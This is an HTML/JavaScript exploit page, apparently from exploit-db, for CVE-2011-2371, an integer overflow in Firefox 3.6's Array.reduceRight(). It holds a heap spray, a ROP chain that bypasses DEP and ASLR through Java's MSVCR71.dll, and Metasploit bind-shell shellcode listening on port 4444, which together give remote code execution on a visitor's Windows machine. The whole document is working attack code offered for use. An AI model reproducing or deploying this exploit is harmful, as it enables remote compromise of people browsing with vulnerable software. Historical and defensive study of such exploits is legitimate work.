# Title: Mozilla Firefox Array.reduceRight() Integer Overflow Exploit
# Date: 12 Oct 2011
# Author: Matteo Memelli  ryujin -AT- offensive-security.com
# CVE-2011-2371
# Full exploit package: http://www.exploit-db.com/sploits/17974.zip
 
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;ff-i-&lt;3-u&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;
&lt;br /&gt;
Title: Mozilla Firefox Array.reduceRight() Integer Overflow Exploit&lt;br /&gt;
Date: 12 Oct 2011&lt;br /&gt;
Author: Matteo Memelli  ryujin -AT- offensive-security.com&lt;br /&gt;
CVE-2011-2371&lt;br /&gt;
Full exploit package: &lt;br /&gt;
http://www.exploit-db.com/sploits/17974.zip &lt;br /&gt;
&lt;br /&gt;
Thx to dookie for helping ;)&lt;br/&gt;
Vulnerability discovered by Chris Rohlf and Yan Ivnitskiy of Matasano Security&lt;br /&gt;
http://www.mozilla.org/security/announce/2011/mfsa2011-22.html&lt;br/&gt;
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2371&lt;br/&gt;
DEP / ASLR bypassing through JAVA MSVCR71 sayonara rop chain&lt;br/&gt;
Tested on Windows 7 Ultimate / firefox 3.6.16 and 3.6.17&lt;br/&gt;&lt;br/&gt;
&lt;APPLET id=&quot;MyApplet&quot; code=&quot;ph33r.class&quot; width=150 height=50&gt;
You need a Java-enabled browser to pwn this.
&lt;/APPLET&gt;
&lt;/center&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var applet = document.getElementById(&#039;MyApplet&#039;);
 
function spray() {
        // fake object pointers
        var ptrs = unescape(&quot;%u4141&quot; +       // padding
                            // MOV EDX,DWORD[ESI] 0c000048=0c00007c
                            &quot;%u0048%u0c00&quot; +
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141&quot;       + // padding
                            // PIVOT MSVCR71.dll 0x7C370EEF LEA ESP,[ESI-3]
                            //                              RETN 1C75
                            &quot;%u0EEF%u7C37&quot; +
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141&quot;       + // padding
                            &quot;%u240c%u3410&quot; + // 3410240c RETN after PIVOT
                            &quot;%u007c%u0c00&quot; + // 0c00007c PTR TO END OF BUFFER
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u4141%u4141&quot; + // padding
                            &quot;%u002e%u0c00&quot;); // 0c00007c -&gt; 0c00002e
                                             // CALL PIVOT 0x7C370EEF
                                 
        var bheader    = 0x12/2; // u.n.d.e.f.i.n.e.d. string
                                 // beginning of each array element
        var nullt      = 0x2/2;  // string null terminator
         
        // 0:000&gt; ? 0c001cbe   - 0c000012 
        // Evaluate expression: 7340 = 00001cac
        var espoffset  = (7340 /2) - ptrs.length;
        var esppadding = unescape(&quot;%u0c0c%u0c0c&quot;);
        while(esppadding.length &lt; espoffset) {esppadding += esppadding;}
        esppadding = esppadding.substring(0, espoffset);
 
        // sayonara rop chain
        rop  = unescape(&quot;%u4cc1%u7c34&quot;); // pop eax;ret;
        rop += unescape(&quot;%u10c2%u7c34&quot;); // pop ecx;pop ecx;ret;
        rop += unescape(&quot;%u2462%u7c34&quot;); // xor chain; call eax {0x7C3410C2}
        rop += unescape(&quot;%uc510%u7c38&quot;); // writeable loc for lpflOldProtect
        rop += unescape(&quot;%u5645%u7c36&quot;); // pop esi;ret;
        rop += unescape(&quot;%u5243%u7c34&quot;); // ret;
        rop += unescape(&quot;%u8f46%u7c34&quot;); // pop ebp;ret;
        rop += unescape(&quot;%u87ec%u7c34&quot;); // call eax;
        rop += unescape(&quot;%u4cc1%u7c34&quot;); // pop eax;ret;
        rop += unescape(&quot;%ufdff%uffff&quot;); // {size}
        rop += unescape(&quot;%ud749%u7c34&quot;); // neg eax;ret; {adjust size}
        rop += unescape(&quot;%u58aa%u7c34&quot;); // add ebx, eax;ret; {size into ebx}
        rop += unescape(&quot;%u39fa%u7c34&quot;); // pop edx;ret;
        rop += unescape(&quot;%uffc0%uffff&quot;); // {flag}
        rop += unescape(&quot;%u1eb1%u7c35&quot;); // neg edx;ret; {adjust flag}
        rop += unescape(&quot;%u4648%u7c35&quot;); // pop edi;ret;
        rop += unescape(&quot;%u30ea%u7c35&quot;); // mov eax,[eax];ret;
        rop += unescape(&quot;%u4cc1%u7c34&quot;); // pop eax;ret;
        rop += unescape(&quot;%ua181%u7c37&quot;); // (VP RVA + 30 - {0xEF adjustment}
        rop += unescape(&quot;%u5aeb%u7c35&quot;); // sub eax,30;ret;
        rop += unescape(&quot;%u8c81%u7c37&quot;); // pushad; add al,0xef; ret;
        rop += unescape(&quot;%u683f%u7c36&quot;); // push esp;ret;
        rop += unescape(&quot;%ubc90%u0c0c%u0c0c&quot;); // NOP / MOV ESP,0x0c0c0c0c
 
        // windows/shell_bind_tcp - 341 bytes
        // http://www.metasploit.com
        // VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process,
        // InitialAutoRunScript=, AutoRunScript=
        var shell = unescape(&quot;%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b&quot; +
                             &quot;%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a&quot; +
                             &quot;%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf&quot; +
                             &quot;%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001&quot; +
                             &quot;%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18&quot; +
                             &quot;%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31&quot; +
                             &quot;%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03&quot; +
                             &quot;%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66&quot; +
                             &quot;%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489&quot; +
                             &quot;%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a&quot; +
                             &quot;%ueb12%u5d86%u3368%u0032%u6800%u7377%u5f32&quot; +
                             &quot;%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900&quot; +
                             &quot;%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050&quot; +
                             &quot;%u5040%u5040%uea68%udf0f%uffe0%u89d5%u31c7&quot; +
                             &quot;%u53db%u0268%u1100%u895c%u6ae6%u5610%u6857&quot; +
                             &quot;%udbc2%u6737%ud5ff%u5753%ub768%u38e9%uffff&quot; +
                             &quot;%u53d5%u5753%u7468%u3bec%uffe1%u57d5%uc789&quot; +
                             &quot;%u7568%u4d6e%uff61%u68d5%u6d63%u0064%ue389&quot; +
                             &quot;%u5757%u3157%u6af6%u5912%ue256%u66fd%u44c7&quot; +
                             &quot;%u3c24%u0101%u448d%u1024%u00c6%u5444%u5650&quot; +
                             &quot;%u5656%u5646%u564e%u5356%u6856%ucc79%u863f&quot; +
                             &quot;%ud5ff%ue089%u564e%uff46%u6830%u8708%u601d&quot; +
                             &quot;%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff&quot; +
                             &quot;%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72&quot; +
                             &quot;%u006a%uff53%u41d5&quot;);
        rop += shell;
 
        var tr_padding = unescape(&quot;%u0c0c%u0c0c&quot;);
        while(tr_padding.length &lt; 0x80000) {tr_padding += tr_padding;}
 
        var dummy = ptrs + esppadding + rop + tr_padding; 
        var hspray = dummy.substring(0,0x80000 - bheader - nullt);   
 
        // Allocation of 64 blocks of 1Mb.
        HeapBlocks = new Array()
        for (i=0;i&lt;0x40;i++){
            HeapBlocks[i] += hspray;
        }
  }
 
spray();
hola = new Array;
hola.length = 2197815302;  // 0x0c000014 beginning of sprayed block
 
w00t = function ph33r(prev, myobj, indx, array) {
  alert(myobj[0]); // trigger getProperty
}
 
hola.reduceRight(w00t,1,2,3);
 
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;


